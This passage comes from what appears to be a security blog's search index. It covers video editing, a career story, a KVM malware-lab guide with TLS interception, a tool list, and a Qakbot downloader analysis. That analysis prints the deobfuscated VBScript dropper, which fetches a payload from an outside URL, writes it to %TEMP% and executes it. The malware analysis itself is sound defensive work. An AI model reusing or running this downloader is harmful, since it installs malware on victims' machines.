","date":"2022-06-23","objectID":"/2022/06/linux-video-editing/:0:0","tags":["Video","Editing"],"title":"Video Editing in Linux","uri":"/2022/06/linux-video-editing/"},{"categories":["Docs"],"content":"OBS Studio I use OBS Studio to do my screen recording and voice recording. To add a screen to capture just click the + button under sources, then select screen capture and the monitor you wish to share. Once this is completed, click the gear on Mic/Aux and Filters. I personally use the following filters in order. Noise Suppression Noise Gate Compressor Limiter Compressor This will ensure the noise from your mic is acceptable, also it ensures your voice will be nice and loud so people can hear you properly ","date":"2022-06-23","objectID":"/2022/06/linux-video-editing/:1:0","tags":["Video","Editing"],"title":"Video Editing in Linux","uri":"/2022/06/linux-video-editing/"},{"categories":["Docs"],"content":"Audacity Once I finish recording in OBS Studio, I’ll take the video and convert it to a mp3 using ffmpeg. ffmpeg -i video.mkv video.mp3 I’ll then peform the following filters in order. Compressor Limiter Compressor During these steps you will be able to ensure the waveform is at it’s peak loudness. ","date":"2022-06-23","objectID":"/2022/06/linux-video-editing/:2:0","tags":["Video","Editing"],"title":"Video Editing in Linux","uri":"/2022/06/linux-video-editing/"},{"categories":["Docs"],"content":"Blender Editing Tips I’ll then import the video into my Blender video template (just a Blender video project containing my intro and other overlays), which contains my intro. Once imported, I will remove the audio and replace it with the edited audio from audacity. Navigating Blender as opposed to other video sequence editors can be quite different at first. It only took me a couple days to get used to the new controls compared to Kdenlive. ","date":"2022-06-23","objectID":"/2022/06/linux-video-editing/:3:0","tags":["Video","Editing"],"title":"Video Editing in Linux","uri":"/2022/06/linux-video-editing/"},{"categories":["Docs"],"content":"Sequencer Action ShortCut zoom mouse wheel up/down up/down shift + mouse wheel up/down left/right ctrl + mouse wheel up/down pan mouse wheel down and move cut clip the ‘k’ key You can resize clips by selecting the handle at the end or beginning of them, then drag using the ‘g’ key. ","date":"2022-06-23","objectID":"/2022/06/linux-video-editing/:3:1","tags":["Video","Editing"],"title":"Video Editing in Linux","uri":"/2022/06/linux-video-editing/"},{"categories":["Docs"],"content":"Audio To display the audio simply, select the audio then check Display Waveform. ","date":"2022-06-23","objectID":"/2022/06/linux-video-editing/:3:2","tags":["Video","Editing"],"title":"Video Editing in Linux","uri":"/2022/06/linux-video-editing/"},{"categories":["Docs"],"content":"Rendering Blender is a little different, to ensure you render from beginning to end you need to specify the ending frame at the bottom right. Though this may seem inconvient it is actually very helpful as it gives you total control. To render the video, simply go to the printer icon in the top right, then under output change select where you want the file to go and the file format to be ffmpeg using the MPEG-4 container. Once you have set the render window and the output file and format you can click Render then Render Animation and it will begin. You will then notice a progress bar at the bottom indicating how far along your render is. ","date":"2022-06-23","objectID":"/2022/06/linux-video-editing/:3:3","tags":["Video","Editing"],"title":"Video Editing in Linux","uri":"/2022/06/linux-video-editing/"},{"categories":["Docs"],"content":"Conclusion I’ll continue to update this guide as I refine my editing process. 🥰 ","date":"2022-06-23","objectID":"/2022/06/linux-video-editing/:4:0","tags":["Video","Editing"],"title":"Video Editing in Linux","uri":"/2022/06/linux-video-editing/"},{"categories":["Personal"],"content":"How I went from nothing to a career in cyber.","date":"2022-06-21","objectID":"/2022/06/career/","tags":["Career","Malware","Reversing","Analysis"],"title":"From Nothing to a Career in Cyber","uri":"/2022/06/career/"},{"categories":["Personal"],"content":"In this blog, I’ll discuss some of my troubles in life getting started and how I really got the drive to move forward. ","date":"2022-06-21","objectID":"/2022/06/career/:0:0","tags":["Career","Malware","Reversing","Analysis"],"title":"From Nothing to a Career in Cyber","uri":"/2022/06/career/"},{"categories":["Personal"],"content":"How It Started I took advanced placement courses all throughout high school, I had one goal at this point, get a computer science degree. At this time universities were really telling parents that their kids need a secondary education. This was all happening between the year 2000 and 2005. I was told that going to university is the only option after high school. ","date":"2022-06-21","objectID":"/2022/06/career/:1:0","tags":["Career","Malware","Reversing","Analysis"],"title":"From Nothing to a Career in Cyber","uri":"/2022/06/career/"},{"categories":["Personal"],"content":"University Believing that I needed a post secondary degree, I got accepted to go to a university to study computer science. I performed very well on labs but did poorly in discrete mathematics. It was very interesting how they got me to write code on sheets of paper instead of using an actual computer. Either way, the professor told me that if I cannot pass the discrete mathematics course that I should not pursue a career in computers at all. This lead me down the road to my second passion which was music. When asking about jobs regarding their program they stated there would be work. About halfway through finishing this degree, the 2008 crash happened which had lasting effects on many industries. I had a decision to make, to finish the degree or to drop out. I decided to press onward and graduate, with a decent GPA in music, more specifically a specialization in audio recording and a minor in sociology. ","date":"2022-06-21","objectID":"/2022/06/career/:2:0","tags":["Career","Malware","Reversing","Analysis"],"title":"From Nothing to a Career in Cyber","uri":"/2022/06/career/"},{"categories":["Personal"],"content":"Under Employment Once I finished my degree in music with a minor in sociology, I looked for work anywhere I could find it. To say I was unsuccessful would be an understatement. The market was too saturated with people who already had jobs and there were no positions open anywhere. This lead me to working minimum wage jobs after university, which to pay off the mountain of dept was not easily possible. This pattern lead me down the road to where I completely broke, I ended up being completely unemployed and on social assistance. It was then I realized that I hit rock bottom, nothing but depression and anxiety about my financial future from here continue to plague my very existence. ","date":"2022-06-21","objectID":"/2022/06/career/:3:0","tags":["Career","Malware","Reversing","Analysis"],"title":"From Nothing to a Career in Cyber","uri":"/2022/06/career/"},{"categories":["Personal"],"content":"How it Started Getting Better It all started getting better when my caseworker told me to start learning about computers again. I could barely afford to eat, so it was very important for save what little money I could to invest in 5 dollar Udemy courses. This lead me into a major self learning adventure in C++, C and Python programming. After some time, I discovered Defcon talks on YouTube, these inspired me to attempt learning to be an ethical hacker. I would spend every day beginning to end when not taking care of my child trying to push myself forward and learn everything I can. Eventually both myself and my husband took minimum wage jobs again and did our best to establish a living. This was still very challenging, but eventually I got to attend a cybersecurity meetup in my area. This is when everything changed. ","date":"2022-06-21","objectID":"/2022/06/career/:4:0","tags":["Career","Malware","Reversing","Analysis"],"title":"From Nothing to a Career in Cyber","uri":"/2022/06/career/"},{"categories":["Personal"],"content":"How it Improved I then became a tier 1 cybersecurity analyst, then later moved into programming and then building an entire threat research and detection team. Again, I was working full time and have a family but took all that experience and drive to continue to push myself forward with self learning malware analysis and reverse engineering. ","date":"2022-06-21","objectID":"/2022/06/career/:5:0","tags":["Career","Malware","Reversing","Analysis"],"title":"From Nothing to a Career in Cyber","uri":"/2022/06/career/"},{"categories":["Personal"],"content":"Lessons Learned Universities want your money Job markets matter Don’t always believe what a mentor tells you, verify Be Determined ","date":"2022-06-21","objectID":"/2022/06/career/:6:0","tags":["Career","Malware","Reversing","Analysis"],"title":"From Nothing to a Career in Cyber","uri":"/2022/06/career/"},{"categories":["Personal"],"content":"Conclusion I’m still working on improving my finacial standing to this day, I had spent the better part of a decade being underemployed or in poverty. These financial scars will now heal over time. I’m very confident that I’ll be debt free soon enough. Everyone faces adversity in their lives in one form or another, for me the 2008 crash and taking poor advice from a university professor pretty much destroyed me. I’m trying my best to make it my mission that the same situation does not happen to others. Again, most of my drive and modivation came from being at the lowest point of my life. But this does not mean it has to be that way for you too. ","date":"2022-06-21","objectID":"/2022/06/career/:7:0","tags":["Career","Malware","Reversing","Analysis"],"title":"From Nothing to a Career in Cyber","uri":"/2022/06/career/"},{"categories":["Docs"],"content":"How to create a KVM malware lab.","date":"2022-06-18","objectID":"/2022/06/kvm-malware-lab/","tags":["Cheatsheet"],"title":"KVM Malware Lab Guide","uri":"/2022/06/kvm-malware-lab/"},{"categories":["Docs"],"content":"This is my guide for setting up your very own malware lab using KVM. Before you start, this guide assumes you have an AirVPN subscription or another equivalent one, which provides a .ovpn file. NOTE: I like to have internet enabled on my analysis VMs and this comes with extra security considerations and potential risk if you do not perform the setup correctly. It is recommended that you have your KVM host machine on a DMZ. Most home routers do have DMZ settings, just consult your manual. This guide is not intended for beginners. If you have used VirtualBox or VMWare Workstation in the past, Spice is just like the guest tools for these but for KVM, which allows you to copy/paste and copy samples to your VMs from your host machine. NOTE: This is not a very stealthy setup as of yet, so do expect some malware to detect your VMs. I will continue to update this guide for stealth once I have a server or workstation. This requires forking the qemu code and modifying it. Once this guide is completed, you should have networking that looks like this: ┌────────┐ │Internet│ └───┬────┘ │ ┌─────┴──────┐ │Host Machine│ Kernel Virtual Machine (KVM) on DMZ └─────┬──────┘ │ ┌─┴─┐ │NAT│ (default) └─┬─┘ │ ┌───┴───┐ ┌────────┐ │PFSense├─┤Isolated│ LAN 10.0.1.1/24 (vmbr0) └───────┘ └───┬────┘ │ ┌──┴───┐ │Remnux│ Static Analysis and Interception └──┬───┘ │ ┌───┴────┐ │Isolated│ Analysis LAN 10.0.2.1/24 (vmbr1) └─┬──────┤ │ │ ┌───────┴───┐ ┌┴──────┐ │Analysis VM│ │Windows│ Dynamic Analysis └───────────┘ └───────┘ ","date":"2022-06-18","objectID":"/2022/06/kvm-malware-lab/:0:0","tags":["Cheatsheet"],"title":"KVM Malware Lab Guide","uri":"/2022/06/kvm-malware-lab/"},{"categories":["Docs"],"content":"Install KVM This section of the guide will show you how to install KVM on your Linux host. Verify you have virtualization enabled grep -Po '(vmx|svm)[^\\x20]+' /proc/cpuinfo | sort | uniq # For Host Machine cat /sys/module/kvm_intel/parameters/nested # Nested Virtualization Only (intel) cat /sys/module/kvm_amd/parameters/nested # Nested Virtualization Only (amd) Enable Nested Virtualization (optional) sudo nano /etc/modprobe.d/kvm.conf # Nested Virtualization Configuration File # Add the following configuration : ' options kvm_intel nested=1 ' # save then reboot sudo reboot If there is any output from the previous command then virtualization is enabled, otherwise, enable it in your bios and try again NOTE: Using nested virtualization will come with significant performance costs, it is much more advisable to use Linux with KVM on bare metal Install dependencies sudo apt update sudo apt install -y virt-manager qemu-kvm build-essential python-is-python3 Verify that libvirtd service is running sudo systemctl enable libvirtd sudo systemctl start libvirtd Add current user to the libvirt group sudo usermod -a -G libvirt $USER Install modified version of SeaBios (modifies src/config.h to more realistic values) git clone https://github.com/c3rb3ru5d3d53c/seabios.git cd seabios/ make sudo cp /usr/share/seabios/bios.bin /usr/share/seabios/bios.bin.bak sudo cp out/bios.bin /usr/share/seabios/bios.bin If you want virt-manager to be able to access your home directory, you may need to set upstream permissions (this step is optional) sudo setfacl -m u:libvirt-qemu:rx /home/$USER Once all has been completed do a reboot sudo reboot ","date":"2022-06-18","objectID":"/2022/06/kvm-malware-lab/:1:0","tags":["Cheatsheet"],"title":"KVM Malware Lab Guide","uri":"/2022/06/kvm-malware-lab/"},{"categories":["Docs"],"content":"Create VMS This section will guide you through the creation of the malware lab with KVM using virt-manager. ","date":"2022-06-18","objectID":"/2022/06/kvm-malware-lab/:2:0","tags":["Cheatsheet"],"title":"KVM Malware Lab Guide","uri":"/2022/06/kvm-malware-lab/"},{"categories":["Docs"],"content":"Create Virtual Networks Edit -\u003e Connection Details -\u003e + -\u003e vmbr0 Isolated (PFSense LAN) Disable both IPV4 and IPv6 (Provided by PFSense) Edit -\u003e Connection Details -\u003e + -\u003e vmbr1 Isolated (Analysis LAN) Disable both IPV4 and IPv6 (Provided by Remnux) ","date":"2022-06-18","objectID":"/2022/06/kvm-malware-lab/:2:1","tags":["Cheatsheet"],"title":"KVM Malware Lab Guide","uri":"/2022/06/kvm-malware-lab/"},{"categories":["Docs"],"content":"Create PFSense VM The primary purpose of the PFSense VM is to provide an easy way to manage firewall rules between your home or work network and the internet. I know most people disable their internet when analyzing malware. However, I like to use an anonymous VPN and with that comes additional risk and considerations. Download: https://www.pfsense.org/download/ Create qcow2 image: qemu-img create -f qcow2 pfsense.qcow2 16G Create a new virtual machine Import Existing Disk Image Select pfsense.qcow2 as the storage path Select FreeBSD as the OS Name: pfsense Customize configuration before install Set first NIC to NAT Add Hardware -\u003e Network -\u003e vmbr0 (PFSense Network) Add Hardware -\u003e Network -\u003e CDROM Device -\u003e Manager -\u003e PFSense ISO Boot Options -\u003e Set CDROM device as first in boot order Start the VM Set LAN as 10.0.1.1/24 in PFSense setup ","date":"2022-06-18","objectID":"/2022/06/kvm-malware-lab/:2:2","tags":["Cheatsheet"],"title":"KVM Malware Lab Guide","uri":"/2022/06/kvm-malware-lab/"},{"categories":["Docs"],"content":"Create Remnux VM (Ubuntu 22.04) The primary purpose of this VM is to allow you to perform static analysis of binaries using IDA, Ghidra or Cutter but also acts as the gateway for your entire analysis subnet. This gives you full control over the DNS and DHCP server for traffic interception and more. NOTE: The official remnux distribution OS is quite outdated, to solve this it is recommended to use the latest LTS image from Ubuntu as the VM and instead use remnux within that VM as a container. Download https://releases.ubuntu.com/22.04/ Create the disk image qemu-img create -f qcow2 remnux.qcow2 40G Create a new virtual machine Import existing disk image Select remnux.qcow2 as the storage path Select Ubuntu as the OS Name: remnux Customize configuration before install Set first NIC to vmbr0 (PFSense Network) Add Hardware -\u003e Network -\u003e vmbr1 (Analysis Network) Add Hardware -\u003e Storage -\u003e CDROM Device-\u003e Manage -\u003e Ubuntu ISO Image Boot Options -\u003e Set CDROM device as first in boot order Start VM Install dependancies sudo apt update sudo apt install dnsmasq isc-dhcp-server openvpn docker.io spice-vdagent sudo systemctl enable spice-vdagent sudo systemctl enable docker sudo usermod -a -G docker $USER # logout and login again Create your remnux docker container docker run --rm -it -v $(pwd):$HOME -u remnux remnux/remnux-distro:focal bash Set up the interfaces sudo nano /etc/netplan/01-network-manager-all.yaml # Replace it with the following contents : 'network: version: 2 renderer: networkd ethernets: enp1s0: dhcp4: yes enp7s0: addresses: - 10.0.2.1/24 ' Disable dnsmasq conflicts with systemd-resolved sudo nano /etc/systemd/resolved.conf # Append DNSStubListener=no to the end of the file and save sudo systemctl restart systemd-resolved sudo systemctl enable dnsmasq sudo systemctl restart dnsmasq Setup the dhcp server sudo nano /etc/dhcp/dhcpd.conf # Add the following content to the configuration : 'subnet 10.0.2.0 netmask 255.255.255.0 { option domain-name \"malware.wtf\"; default-lease-time 600; max-lease-time 7200; option routers 10.0.2.1; option subnet-mask 255.255.255.0; option broadcast-address 10.0.2.255; option domain-name-servers 10.0.2.1; range 10.0.2.2 10.0.2.254; }' sudo systemctl enable isc-dhcp-server sudo systemctl restart isc-dhcp-server Browse to https://10.0.1.1 and login with admin:pfsense and setup your own password for PFSense. Add firewall rules to block your local network, in my case it was to block everything from LAN net to 192.168.0.1/24. Apply the changes Setup internet forwarding sudo iptables -t nat -A POSTROUTING -o tun0 -j MASQUERADE sudo apt install iptables-persistent # Say yes to both prompts sudo nano /etc/sysctl.conf # Uncomment the line with net.ipv4.ip_forward=1 sudo sysctl -w net.ipv4.ip_forward=1 Create a script to allow to you start your VPN nano vpn.sh # Add the following contents and save : ' #!/usr/bin/env bash openvpn --daemon --config AirVPN_All-servers_UDP-443.ovpn ' chmod +x vpn.sh sudo ./vpn.sh Setup TLS Decryption with MITMProxy sudo apt update sudo apt install -y wireshark tshark # Say yes to non-super user packet capture sudo usermod -a -G wireshark $USER # logout then login again wget https://snapshots.mitmproxy.org/8.1.0/mitmproxy-8.1.0-linux.tar.gz tar -xzvf mitmproxy-8.1.0-linux.tar.gz sudo mv mitmdump /usr/bin/ sudo mv mitmproxy /usr/bin/ sudo mv mitmweb /usr/bin/ wget https://gist.githubusercontent.com/c3rb3ru5d3d53c/d9eb9d752882fcc630d338a6b2461777/raw/f56cbef4b98c7bad8f265534eabf696923b649a2/mitmpcap chmod +x mitmpcap sudo mv mitmpcap /usr/bin/ wget https://gist.githubusercontent.com/c3rb3ru5d3d53c/3bc8041a182467ccae0207394c1e16b3/raw/33bf201da721ae8f8dc057480221a3c6612e7c11/mitmhttp chmod +x mitmhttp sudo mv mitmhttp /usr/bin/ sudo mkdir /root/.mitmproxy Once completed, you should be able to reboot and run sudo ./vpn.sh to get connected to the internet. NOTE: The internet will not work on the Analysis LAN unless you have VPN enabled as we set the internet to be forwarded through ","date":"2022-06-18","objectID":"/2022/06/kvm-malware-lab/:2:3","tags":["Cheatsheet"],"title":"KVM Malware Lab Guide","uri":"/2022/06/kvm-malware-lab/"},{"categories":["Docs"],"content":"Create Windows VM This VM will sit on the Analysis LAN, its main purpose is to dynamically analyze malware by executing it. This includes debugging, tracing API calls and more. NOTE: With a Windows VM it is very important to ensure your boot drive is using the VirtIO drivers. Download VirtIO ISO Create disk image qemu-img create -f qcow2 windows.qcow2 128G Create a new virtual machine Import existing disk image Select windows.qcow2 as the storage path Select Windows as the OS Name: windows Customize configuration before install Set first NIC to vmbr1 (Analysis LAN) Add Hardware -\u003e Storage -\u003e CDROM Device-\u003e Manage -\u003e Windows ISO Image Add Hardware -\u003e Storage CDROM Device -\u003e Manage -\u003e VirtIO ISO Boot Options -\u003e Set CDROM device for Windows ISO to boot first Remove the SATA Disk and replace with one for VirtIO pointing to windows.qcow2 Start installation During the Windows install the VirtIO disk will not show unless you browse to the VirtIO ISO and select the folder with the drivers for your version of Windows. Once completed, you can proceed with the installation. Once Windows is installed, open Device Manager and identify all the drivers with question marks and update them using the VirtIO ISO CDROM. Download and install Spice Guest Tools Reboot the VM If you are unable to boot using the VirtIO driver, try the following troubleshooting steps: Open an elevated command prompt and set the VM to boot into safe mode by typing bcdedit /set {current} safeboot minimal shut-down the VM and change the boot device type to virtio boot the VM. It will enter in safe mode. in the booted VM reset the bcdedit settings to allow the machine to boot into the Normal mode by typing (in an elevated command prompt again): bcdedit /deletevalue {current} safeboot Reference: Windows 10 in KVM: change boot disk to Virtio Once you have completed all necessary steps, it is recommended to remove the CDROM drive for the VirtIO drivers. ","date":"2022-06-18","objectID":"/2022/06/kvm-malware-lab/:2:4","tags":["Cheatsheet"],"title":"KVM Malware Lab Guide","uri":"/2022/06/kvm-malware-lab/"},{"categories":["Docs"],"content":"Installing TLS Decryption Certificates This section of the guide will discuss how to get TLS decryption working on your Remnux VM so you can transparently decrypt TLS and capture secrets and pcaps from the analysis network as long as the devices have the root CA installed. On your Remnux machine do the following commands sudo mitmhttp -i \u003canalysis-network-interface\u003e --enable mitmproxy --mode transparent --listen-host 0.0.0.0 --listen-port 8080 On your Windows VM open a browser and go to mitm.it then follow either the Manual or Automated install instructions Manual Install On the webpage download the certificate for Windows Double click the P12 file to start the import wizard Select a certificate store location. This determines who will trust the certificate – only the current Windows user or everyone on the machine. Click Next. Click Next again Leave Password blank and click Next Select Place all certificates in the following store, then click Browse, and select Trusted Root Certification Authorities. Click OK and Next Click Finish Click Yes to confirm the warning dialog. Automated Install certutil.exe -addstore root mitmproxy-ca-cert.cer In your browser visit https://example.com to verify a successful decryption in the mitmproxy interface If the above steps were successful, you can now use the tool mitmpcap to view traffic live with mitmproxy but also use it to capture TLS secrets and a pcap for analysis later. mitmpcap -i enp7s0 -w dump.pcap -m transparent -p 8080 -s secrets.txt -v 1 -f libpcap Once you have finished your capture, press Q then Y to exit mitmproxy. You should then notice you have the files dump.pcap and secrets.txt. The following steps will show you how to use Wireshark to analyze your capture. Open dump.pcap with Wireshark Edit -\u003e Preferences -\u003e Protocols -\u003e TLS -\u003e (Pre)-Master-Secret log filename Browse -\u003e select secrets.txt In the filter bar type http and press Enter You should now have decrypted TLS traffic Once you have completed capturing your traffic and no longer wish to perform interception, disable the redirection by executing the following. sudo mitmhttp -i \u003canalysis-network-interface\u003e --disable ","date":"2022-06-18","objectID":"/2022/06/kvm-malware-lab/:3:0","tags":["Cheatsheet"],"title":"KVM Malware Lab Guide","uri":"/2022/06/kvm-malware-lab/"},{"categories":["Docs"],"content":"Install Malware Analysis Tools Once you have completed the networking and VM creation, you can install your favorite malware analysis tools! You can get a list of my favorite tools here. ","date":"2022-06-18","objectID":"/2022/06/kvm-malware-lab/:4:0","tags":["Cheatsheet"],"title":"KVM Malware Lab Guide","uri":"/2022/06/kvm-malware-lab/"},{"categories":["Docs"],"content":"Establishing a Clean Environment Once you have completed installing your favorite tools, establish a clean environment by taking snapshots of every VM. This will ensure you can go back to those clean states after you have completed an analysis. ","date":"2022-06-18","objectID":"/2022/06/kvm-malware-lab/:5:0","tags":["Cheatsheet"],"title":"KVM Malware Lab Guide","uri":"/2022/06/kvm-malware-lab/"},{"categories":["Docs"],"content":"Sharing Files Between Host and Remnux VM Sometimes we wish to move files that are safe from our Remnux VM to our host machine. To do this, we can use the file system pass-through in KVM. Please note, it is not recommended to have your host and guest tied together at all times, to reduce your risk only mount this when needed and unmount when done. Memory Enable Shared Memory (checkmark) Add Hardware Filesytem hostfs Driver -\u003e virtiofs Source path -\u003e Browse Local -\u003e Select Source Folder to Share Target path -\u003e hostfs XML Tab -\u003e under the filesystem tag put accessmode=passthrough Example XML: \u003cfilesystem type=\"mount\" accessmode=\"passthrough\"\u003e \u003cdriver type=\"virtiofs\"/\u003e \u003cbinary path=\"/usr/lib/qemu/virtiofsd\"/\u003e \u003csource dir=\"/home/\u003cusername\u003e/analysis\"/\u003e \u003ctarget dir=\"hostfs\"/\u003e \u003calias name=\"fs0\"/\u003e \u003caddress type=\"pci\" domain=\"0x0000\" bus=\"0x08\" slot=\"0x00\" function=\"0x0\"/\u003e \u003c/filesystem\u003e Boot Remnux VM Mount the folder cd ~/ mkdir hostfs sudo mount -t virtiofs hostfs hostfs/ # do things here sudo umount hostfs/ ","date":"2022-06-18","objectID":"/2022/06/kvm-malware-lab/:6:0","tags":["Cheatsheet"],"title":"KVM Malware Lab Guide","uri":"/2022/06/kvm-malware-lab/"},{"categories":["Docs"],"content":"Workflow When working with malware it is important to establish a general workflow, please refer to my guide here. ","date":"2022-06-18","objectID":"/2022/06/kvm-malware-lab/:7:0","tags":["Cheatsheet"],"title":"KVM Malware Lab Guide","uri":"/2022/06/kvm-malware-lab/"},{"categories":["Docs"],"content":"Conclusion Once you have the PFSense and Remnux VMs setup, you can create additional VMs on your Analysis LAN to suit your needs. Creating a malware lab using KVM can be a daunting task for beginners compared to using VMWare Workstation or VirtualBox. However, it can benefit your lab in the following ways. Access to source code you can edit to make your VMs super stealthy CPU Emulated VMs (MIPS, ARM, etc.) for IoT malware PCI pass through of hardware Again I cannot recommend KVM enough, it is great for malware analysis! ","date":"2022-06-18","objectID":"/2022/06/kvm-malware-lab/:8:0","tags":["Cheatsheet"],"title":"KVM Malware Lab Guide","uri":"/2022/06/kvm-malware-lab/"},{"categories":["Docs"],"content":"A list of my favorite malware analysis tools","date":"2022-06-17","objectID":"/2022/06/malware-analysis-tools/","tags":["Malware","Analysis"],"title":"Malware Analysis Tool List","uri":"/2022/06/malware-analysis-tools/"},{"categories":["Docs"],"content":"This document contains an extensive list of the malware analysis tools I use on a regular basis. 😄 ","date":"2022-06-17","objectID":"/2022/06/malware-analysis-tools/:0:0","tags":["Malware","Analysis"],"title":"Malware Analysis Tool List","uri":"/2022/06/malware-analysis-tools/"},{"categories":["Docs"],"content":"Tool List tool description x64dbg Debugger Ghidra Reverse Engineering DNSpy Reverse Engineering windbg Debugging Python Scripting OWASP Zap Web Debugging HxD Hex Editing HashMyFiles File Hashing VSCodium Coding PEStudio Triage IDR Interactive Delphi Reconstructor PEBear PE Editing and Triage pe-seive Malware Unpacking Detect it Easy Triage TOR Dark Web Browsing Cutter Reverse Engineering VB Decompiler Pro Reverse Engineering VB Samples Resource Hacker Triage and Unpacking dControl Disabling Windows Defender scDbg Shellcode Emulation xlmDeobfuscator Deobfuscation of XLM Maldocs oletools Maldoc Analysis Sysinternals Dynamic Analysis Nauz File Detector Triage PDF Stream Dumper PDF Maldoc Analysis Wireshark Network Analysis MalUnpack Unpacking Malware Orca MSI Editor 7zip Extracting Archives Dependency Walker DLL Analysis de4dot .NET Deobfuscation dhrake Ghidra Delphi Reversing DidierStevensSuite Misc Analysis blobrunner Shellcode Debugging pafish AntiVM Check Utility x64plgmnr x64dbg Plugin Manager xpeviewer Triage yara File Scanning Utility suricata Network Detection Utility portex Binary Visualization Utility Simple Assembly Explorer .NET Deobfucation novmp VMProtect Devirtualization sysmon System Monitor (Logging) sysmon-config Sysmon Configuration floss Triage (Strings) Hollows Hunter Unpacking iat_patcher Reversing upx Unpacking autoit-ripper AutoIT Reversing pyinstxtractor PyInstaller Reversing uncompyle6 Python Reversing Process Hacker Traige and Analysis Chainsaw Event Log Analysis binlex Binary Genetic Analysis XOpcodeCalc Reversing mitmproxy TLS Decryption mitmpcap TLS Interception PCAP + Secrets mitmhttp TLS Interception Redirect Tool ","date":"2022-06-17","objectID":"/2022/06/malware-analysis-tools/:1:0","tags":["Malware","Analysis"],"title":"Malware Analysis Tool List","uri":"/2022/06/malware-analysis-tools/"},{"categories":["Docs"],"content":"Installing YARA sudo apt update sudo apt install -y build-essential \\ libssl-dev \\ libmagic-dev \\ libtool \\ make \\ gcc \\ pkg-config \\ libprotobuf-dev wget https://github.com/VirusTotal/yara/archive/refs/tags/v4.2.1.tar.gz tar -xzvf v4.2.1.tar.gz cd yara-4.2.1/ ./bootstrap.sh ./configure --enable-macho --enable-magic --enable-dex make -j 4 sudo make install sudo ldconfig ","date":"2022-06-17","objectID":"/2022/06/malware-analysis-tools/:2:0","tags":["Malware","Analysis"],"title":"Malware Analysis Tool List","uri":"/2022/06/malware-analysis-tools/"},{"categories":["Docs"],"content":"Installing Suricata sudo apt-get update sudo apt-get -y install build-essential \\ bsdmainutils \\ libtool \\ git \\ cmake \\ ragel \\ make \\ libmagic-dev \\ libjansson-dev \\ libnss3-dev \\ libgeoip-dev \\ libluajit-5.1-dev \\ libhiredis-dev \\ libboost-dev \\ libpcre3-dev \\ libpcap-dev \\ libnet1-dev\\ libyaml-0-2 \\ libyaml-dev \\ liblz4-dev \\ pkg-config \\ zlib1g \\ zlib1g-dev \\ libcap-ng-dev \\ libcap-ng0 \\ libevent-dev \\ rustc \\ cargo wget https://github.com/OISF/suricata/archive/refs/tags/suricata-6.0.5.tar.gz cd suricata-suricata-6.0.5/ git clone https://github.com/OISF/libhtp sudo cargo install --root /usr/local cbindgen ./autogen.sh ./configure --prefix=/usr --sysconfdir=/etc --localstatedir=/var --enable-luajit --enable-rust make -j 4 sudo make install sudo make install-conf sudo ldconfig ","date":"2022-06-17","objectID":"/2022/06/malware-analysis-tools/:3:0","tags":["Malware","Analysis"],"title":"Malware Analysis Tool List","uri":"/2022/06/malware-analysis-tools/"},{"categories":["Malware"],"content":"Analysis of a Qakbot/Qbot Downlaoder","date":"2020-02-12","objectID":"/2020/02/qakbot-downloader/","tags":["QakBot","QBot","Bot"],"title":"Qakbot/Qbot Downloader","uri":"/2020/02/qakbot-downloader/"},{"categories":["Malware"],"content":"Situation: I came across an interesting obfuscated sample on Any.Run. ","date":"2020-02-12","objectID":"/2020/02/qakbot-downloader/:1:0","tags":["QakBot","QBot","Bot"],"title":"Qakbot/Qbot Downloader","uri":"/2020/02/qakbot-downloader/"},{"categories":["Malware"],"content":"Metadata: db2614353dc6c29dbe323dbeafe6b781 ","date":"2020-02-12","objectID":"/2020/02/qakbot-downloader/:2:0","tags":["QakBot","QBot","Bot"],"title":"Qakbot/Qbot Downloader","uri":"/2020/02/qakbot-downloader/"},{"categories":["Malware"],"content":"Analysis: The sample has a ton of comments making the file size total around ~4mb. This was easily parsed out with sed 's/^\\x27//'. The next step is to idenify where code is evaluated which was here exECuTeglOBal sHLW(iDxY). Changed this to WScript.Echo then also had to backtrack for a variable which defined before the evaluation. This variable contained an array of strings which contain object names and the downloader URL, User-Agent etc. I also had to comment out the part which causes it to sleep for 30 seconds. Below is the script after everything has been put into a readable format. Wscript.Sleep 30000 on error resume next set a = WScript.CreateObject(\"WScript.Shell\") set b = WScript.CreateObject(\"Scripting.FileSystemObject\") f = a.ExpandEnvironmentStrings(\"%TEMP%\") \u0026 \"\\x.url\" set c = a.CreateShortcut(f) c.TargetPath = \"an\" c.Save if b.FileExists(f) = false Then e = a.ExpandEnvironmentStrings(\"%TEMP%\") \u0026 \"\\ColorPick.exe\" Call u sub u set d = createobject(\"MSXML2.ServerXMLHTTP.6.0\") set w = createobject(\"Adodb.Stream\") d.Open \"GET\", \"http://mostasharanetalim.ir/wp-content/uploads/2020/02/recent/444444.png\", False d.setRequestHeader \"User-Agent\", \"HanamiRuby\" d.Send with w .type=1 .open .write d.responseBody .savetofile e, 2 end with end sub WScript.Sleep 60000 a.Exec(e) end if ","date":"2020-02-12","objectID":"/2020/02/qakbot-downloader/:3:0","tags":["QakBot","QBot","Bot"],"title":"Qakbot/Qbot Downloader","uri":"/2020/02/qakbot-downloader/"},{"categories":["Malware"],"content":"Network Traffic: GET /wp-content/uploads/2020/02/recent/444444.png HTTP/1.1 Connection: Keep-Alive Accept: */* Accept-Language: en-us User-Agent: HanamiRuby Host: mostasharanetalim.ir The payload named ColorPick.exe Qakbot/QBot will be dropped to the %TEMP% folder. ","date":"2020-02-12","objectID":"/2020/02/qakbot-downloader/:3:1","tags":["QakBot","QBot","Bot"],"title":"Qakbot/Qbot Downloader","uri":"/2020/02/qakbot-downloader/"},{"categories":["Malware"],"content":"IOCS: db2614353dc6c29dbe323dbeafe6b781 hxxp://mostasharanetalim[.]ir/wp-content/uploads/2020/02/recent/444444[.]png User-Agent: HanamiRuby ","date":"2020-02-12","objectID":"/2020/02/qakbot-downloader/:4:0","tags":["QakBot","QBot","Bot"],"title":"Qakbot/Qbot Downloader","uri":"/2020/02/qakbot-downloader/"},{"categories":["Malware"],"content":"References: Samples Any.Run VirusTotal Twitter ","date":"2020-02-12","objectID":"/2020/02/qakbot-downloader/:5:0","tags":["QakBot","QBot","Bot"],"title":"Qakbot/Qbot Downloader","uri":"/2020/02/qakbot-downloader/"},{"categories":["Malware"],"content":"Another interesting analysis of a Vjw0rm variant.","date":"2020-02-10","objectID":"/2020/02/vjw0rm-vipersoftx-variant/","tags":["Vjw0rm","Worm"],"title":"ViperSoftx Vjw0rm Variant","uri":"/2020/02/vjw0rm-vipersoftx-variant/"},{"categories":["Malware"],"content":"Situation: While watching Any.Run for interesting scripts to deobfuscate, I noted that its traffic did appear to be like other variants of vjw0rm however wasn’t sure of what else it could do. 